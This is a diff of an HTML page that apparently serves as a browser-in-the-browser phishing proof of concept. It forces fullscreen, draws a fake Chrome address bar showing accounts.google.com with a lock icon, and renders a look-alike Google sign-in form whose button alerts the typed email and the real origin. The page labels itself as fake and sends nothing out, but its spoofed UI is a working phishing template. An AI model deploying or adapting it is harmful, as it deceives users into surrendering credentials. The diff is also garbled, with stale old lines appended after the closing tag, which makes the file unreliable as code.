@@ -1,40 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <style>
-  body{margin:0;background:#111;color:#fff;font-family:sans-serif}
-  #cover{
-    position:fixed;inset:0;z-index:999999;
-    background:#0f0f0f;padding:20px;overflow:auto
-  }
-  input{width:100%;padding:14px;margin:8px 0;background:#222;color:#fff;border:1px solid #444;box-sizing:border-box}
+ body{margin:0;font-family:Roboto,Arial}
+ #landing{padding:40px;text-align:center}
+ #bluebar{background:#4285f4;color:white;padding:14px;text-align:center;cursor:pointer;font-weight:bold}
+ #fakeBrowser{display:none}
+ #fakeBar{background:#202124;color:#e8eaed;padding:8px 12px;display:flex;align-items:center;gap:8px;font-size:13px}
+ #fakeBar span.lock{color:#8ab4f8}
+ #fakeUrl{background:#35363a;border-radius:20px;padding:6px 14px;flex:1}
+ #googleBox{width:320px;margin:80px auto;background:white;padding:30px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,.2);text-align:center}
+ input{width:100%;padding:12px;margin:8px 0;border:1px solid #dadce0;border-radius:4px;box-sizing:border-box}
+ button.next{background:#1a73e8;color:white;border:0;padding:10px;width:100%;border-radius:4px;margin-top:16px}
 </style>
 </head>
 <body>
 
-<div id="cover">
-  <h1 style="color:red;margin:0">LOGIN TIMEOUT</h1>
-  <p>Domain di address bar masih <b>bonex1927.github.io</b> padahal ini konten palsu</p>
-  
-  <button id="fsBtn" style="width:100%;padding:16px;background:red;color:white;font-size:18px;font-weight:bold;border:0;margin:10px 0">
-    FULLSCREEN - HILANGKAN URL BAR
-  </button>
+<div id="landing">
+  <h2>Welcome</h2>
+  <p>Please login to continue</p>
+  <div id="bluebar" onclick="goFS()">Login to your Google Account!</div>
+  <p style="font-size:12px;color:gray;margin-top:20px">origin: <b id="realOrigin"></b> - ini attacker.io</p>
+</div>
 
-  <p id="info" style="background:#222;padding:10px;font-size:11px;word-break:break-all"></p>
-
-  <input placeholder="Email">
-  <input type="password" placeholder="Password">
-  <button style="width:100%;padding:14px;background:blue;color:white;border:0;margin-top:10px">LOGIN (PALSU)</button>
+<div id="fakeBrowser">
+  <!-- FAKE ADDRESS BAR -->
+  <div id="fakeBar">
+    <span class="lock">🔒</span>
+    <div id="fakeUrl">https://accounts.google.com/signin/v2/identifier</div>
+    <span>⋮</span>
+  </div>
+  <!-- FAKE GOOGLE LOGIN - sama kayak SS lu -->
+  <div id="googleBox">
+    <div style="font-size:22px"><span style="color:#4285f4">G</span><span style="color:#ea4335">o</span><span style="color:#fbbc05">o</span><span style="color:#4285f4">g</span><span style="color:#34a853">l</span><span style="color:#ea4335">e</span></div>
+    <p>Sign in to your Google<br>Account</p>
+    <input id="email" placeholder="Email or phone">
+    <input id="pass" type="password" placeholder="Password">
+    <button class="next" onclick="pwned()">Next</button>
+    <p style="color:red;font-size:11px;margin-top:12px">Warning: No real accounts here!</p>
+    <p style="font-size:10px;color:gray">© 2025 Google</p>
+  </div>
 </div>
 
 <script>
-const info = document.getElementById('info');
-info.innerText = "URL: " + location.href;
+document.getElementById('realOrigin').innerText = location.host;
 
-document.getElementById('fsBtn').onclick = async () => {
-  try {
+async function goFS(){
+  document.getElementById('landing').style.display='none';
+  document.getElementById('fakeBrowser').style.display='block';
+  try{
     await document.documentElement.requestFullscreen();
+  }catch(e){
+    alert("allow fullscreen: "+e)
+  }
+}
+
+function pwned(){
+  // ini yang di SS ke-3 lu: alert dengan origin asli
+  alert("Fake Google - You typed: " + document.getElementById('email').value + "\n\nReal origin: " + location.host + "\n\nThis is NOT google.com, this is "+location.host);
+}
+</script>
+</body>
+</html>    await document.documentElement.requestFullscreen();
     info.innerText += "\n\n>>> FULLSCREEN AKTIF <<<";
   } catch(e){
     alert("Fullscreen error: " + e.message);
